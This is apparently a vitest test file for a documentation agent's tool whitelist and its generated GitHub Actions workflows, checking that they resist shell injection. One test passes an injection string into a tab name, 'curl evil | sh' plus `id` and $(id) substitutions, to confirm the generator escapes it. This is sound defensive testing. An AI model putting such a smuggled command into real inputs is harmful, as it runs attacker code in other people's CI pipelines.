import { readFileSync } from "node:fs";
import { join } from "node:path";
import { describe, it, expect } from "vitest";
import { buildToolBridge } from "../tools.js";
import { buildPullRequestCreateArgs, buildPullRequestTitle } from "../run.js";

describe("agent tool whitelist", () => {
  it("never exposes sync_from_repo (or other non-whitelisted tools) to the model", () => {
    const bridge = buildToolBridge(".");
    const names = bridge.claudeTools.map((tool) => tool.name);
    expect(names).not.toContain("sync_from_repo");
    expect(names).not.toContain("create_project");
    expect(names).toContain("update_page");
    expect(names).toContain("read_api_spec");
    expect(names).toContain("update_api_spec");
  });
});

describe("generated workflow shell-safety (Thally Track injection hardening)", () => {
  it("checks out a connected non-default branch and runs from a monorepo docs root", async () => {
    const { buildDocsAgentWorkflow } = await import("../scaffold.js");
    const yaml = buildDocsAgentWorkflow({
      docsBranch: "release/v2",
      docsRootDir: "apps/docs",
    });
    expect(yaml.match(/ref: "release\/v2"/g)).toHaveLength(2);
    expect(yaml.match(/working-directory: "apps\/docs"/g)).toHaveLength(2);
    expect(() => buildDocsAgentWorkflow({ docsRootDir: "../outside" })).toThrow(
      "repository-relative directory",
    );
  });

  it("normalizes long boundary-slash input in linear time", async () => {
    const { buildDocsAgentWorkflow } = await import("../scaffold.js");
    const boundary = "/".repeat(100_000);
    const yaml = buildDocsAgentWorkflow({
      docsRootDir: `${boundary}apps/docs${boundary}`,
    });

    expect(yaml).toContain('working-directory: "apps/docs"');
  });

  it("targets the checked-out production branch when opening the docs PR", () => {
    expect(
      buildPullRequestCreateArgs(
        "docs: export",
        "body",
        "thally/agent-1",
        "release/v2",
      ),
    ).toEqual([
      "pr",
      "create",
      "--title",
      "docs: export",
      "--body",
      "body",
      "--head",
      "thally/agent-1",
      "--base",
      "release/v2",
    ]);
  });

  it("normalizes untrusted multiline instructions into a bounded PR title", () => {
    const title = buildPullRequestTitle(
      'Fix the Thally Agent Readiness check "Content quality".\n\nGive every page substantive content.',
    );

    expect(title).not.toContain("\n");
    expect(title.length).toBeLessThanOrEqual(72);
    expect(title).toBe(
      'docs: Fix the Thally Agent Readiness check "Content quality". Give ever…',
    );
  });

  it("DOCS_AGENT_WORKFLOW passes dispatch values via env, never inline in the run script", async () => {
    const { DOCS_AGENT_WORKFLOW } = await import("../scaffold.js");
    // The instruction must be an env var, not expanded into the shell assignment.
    expect(DOCS_AGENT_WORKFLOW).toMatch(
      /INSTRUCTION:\s*\$\{\{\s*github\.event\.client_payload\.instruction/,
    );
    expect(DOCS_AGENT_WORKFLOW).not.toMatch(/INSTRUCTION="\$\{\{/);
  });

  it("trackSenderWorkflow triggers on a merged PR and never inlines untrusted content", async () => {
    const { trackSenderWorkflow } = await import("../scaffold.js");
    const yaml = trackSenderWorkflow("acme/docs", {
      owner: "acme",
      repo: "api",
      outputTab: "API Reference",
    });
    // Triggers on a merged pull_request, not a push.
    expect(yaml).toMatch(/on:\s*\n\s*pull_request:/);
    expect(yaml).toContain("github.event.pull_request.merged == true");
    // PR url + author flow through ENV; the run body references only the vars.
    expect(yaml).toMatch(
      /THALLY_PR_URL:\s*\$\{\{\s*github\.event\.pull_request\.html_url/,
    );
    expect(yaml).not.toMatch(/from_pr\]=\$\{\{/);
    expect(yaml).not.toMatch(/requester\]=\$\{\{/);
    // No unescaped double-quotes around the tab that could break the assignment.
    expect(yaml).not.toContain('\\"API Reference\\"');
  });

  it("docs-agent workflow accepts app-resolved PR context without exposing it to shell parsing", async () => {
    const { DOCS_AGENT_WORKFLOW } = await import("../scaffold.js");
    expect(DOCS_AGENT_WORKFLOW).toContain(
      "TRACK_CONTEXT: ${{ github.event.client_payload.context || inputs.context }}",
    );
    expect(DOCS_AGENT_WORKFLOW).toContain(
      `printf '%s' "$TRACK_CONTEXT" > "$CONTEXT_FILE"`,
    );
    expect(DOCS_AGENT_WORKFLOW).toContain('--context-file "$CONTEXT_FILE"');
    expect(DOCS_AGENT_WORKFLOW).not.toContain("printf '$TRACK_CONTEXT'");
  });

  it("docs-agent workflow supplies a model when the optional repository variable is unset", async () => {
    const { DOCS_AGENT_WORKFLOW, DOCS_AGENT_WORKFLOW_CONTRACT } =
      await import("../scaffold.js");
    expect(DOCS_AGENT_WORKFLOW_CONTRACT).toBe("thally-track/v4");
    expect(DOCS_AGENT_WORKFLOW).toContain(
      "THALLY_AGENT_MODEL: ${{ vars.THALLY_AGENT_MODEL || 'claude-sonnet-5' }}",
    );
  });

  it("revises receiver installation separately from the broker protocol", async () => {
    const { DOCS_AGENT_WORKFLOW, DOCS_AGENT_WORKFLOW_CONTRACT, DOCS_AGENT_WORKFLOW_REVISION } =
      await import("../scaffold.js");
    expect(DOCS_AGENT_WORKFLOW_CONTRACT).toBe("thally-track/v4");
    expect(DOCS_AGENT_WORKFLOW_REVISION).toBe("thally-track-receiver/v1");
    expect(DOCS_AGENT_WORKFLOW.split("\n").slice(0, 2)).toEqual([
      `# Contract: ${DOCS_AGENT_WORKFLOW_CONTRACT}`,
      `# Receiver: ${DOCS_AGENT_WORKFLOW_REVISION}`,
    ]);
  });

  it("brokers readiness PR creation through GitHub OIDC without an App token", async () => {
    const { DOCS_AGENT_WORKFLOW } = await import("../scaffold.js");

    expect(DOCS_AGENT_WORKFLOW).toContain("id-token: write");
    expect(DOCS_AGENT_WORKFLOW).toContain(
      "THALLY_PR_GRANT: ${{ github.event.client_payload.thally_pr_grant }}",
    );
    expect(DOCS_AGENT_WORKFLOW).toContain(
      'echo "::add-mask::$THALLY_PR_GRANT"',
    );
    expect(DOCS_AGENT_WORKFLOW).toContain("audience=thally-readiness-pr");
    expect(DOCS_AGENT_WORKFLOW).toContain(
      "https://app.thally.io/api/github/readiness-pr",
    );
    expect(DOCS_AGENT_WORKFLOW).toContain(
      "deploy-preview-[0-9]+--thally-cloud\\.netlify\\.app",
    );
    expect(DOCS_AGENT_WORKFLOW).not.toContain("thally_github_token");
  });

  it("keeps the repository workflow synchronized with the public generator", async () => {
    const { DOCS_AGENT_WORKFLOW } = await import("../scaffold.js");
    const checkedInWorkflow = readFileSync(
      join(process.cwd(), ".github", "workflows", "thally-agent.yml"),
      "utf8",
    );

    expect(checkedInWorkflow).toBe(DOCS_AGENT_WORKFLOW);
  });

  it("docs-agent workflow resolves the CLI in both standalone sites and the source monorepo", async () => {
    const { DOCS_AGENT_WORKFLOW } = await import("../scaffold.js");
    expect(DOCS_AGENT_WORKFLOW).toContain('root.workspaces.includes("packages/*")');
    expect(DOCS_AGENT_WORKFLOW).toContain(
      "npx --yes --ignore-scripts --package=@thallylabs/cli@0.8.122 thally",
    );
    expect(DOCS_AGENT_WORKFLOW).toContain("node packages/cli/dist/index.js");
  });

  it("trackSenderWorkflow covers all preview actions + the loop guard, matching the webhook path", async () => {
    const { trackSenderWorkflow } = await import("../scaffold.js");
    const { DOCS_PREVIEW_LABEL, TRACK_OWNED_BRANCH_PREFIXES } =
      await import("@thallylabs/mcp/track");
    const yaml = trackSenderWorkflow("acme/docs", {
      owner: "acme",
      repo: "api",
    });
    // Fires on merges AND on opened/reopened/labeled/synchronize (preview) —
    // same action set the webhook honors, so Mode B and Mode C don't diverge.
    expect(yaml).toMatch(
      /types:\s*\[closed, labeled, synchronize, opened, reopened\]/,
    );
    // Loop guard + preview label come from the shared constants (no drift).
    for (const prefix of TRACK_OWNED_BRANCH_PREFIXES) {
      expect(yaml).toContain(
        `!startsWith(github.event.pull_request.head.ref, '${prefix}')`,
      );
    }
    expect(yaml).toContain(
      `contains(github.event.pull_request.labels.*.name, '${DOCS_PREVIEW_LABEL}')`,
    );
  });

  it("trackSenderWorkflow bakes the same instruction prose as the webhook (single source) and escapes hostile config", async () => {
    const { trackSenderWorkflow } = await import("../scaffold.js");
    const { buildTrackInstruction } = await import("@thallylabs/mcp/track");
    const yaml = trackSenderWorkflow("acme/docs", {
      owner: "acme",
      repo: "api",
    });
    // The prose is buildTrackInstruction's, with the PR number as the runtime env
    // var — not a re-authored copy that can drift.
    const merged = buildTrackInstruction(
      { owner: "acme", repo: "api" },
      { number: "${THALLY_PR_NUMBER}" as unknown as number },
    );
    expect(yaml).toContain(`INSTRUCTION="${merged}"`);
    expect(yaml).toContain("An OPEN pull request in acme/api");

    // A tab name carrying shell metacharacters is escaped for the double-quoted
    // bash string — no unescaped quote/backtick/$ can break out or execute.
    const hostile = trackSenderWorkflow("acme/docs", {
      owner: "acme",
      repo: "api",
      outputTab: 'A" ; curl evil | sh; `id` $(id)',
    });
    expect(hostile).toContain('\\"');
    // The raw unescaped quote sequence must NOT survive into the bash string.
    expect(hostile).not.toContain('A" ;');
    expect(hostile).toContain("\\`id\\`");
    expect(hostile).toContain("\\$(id)");
  });
});
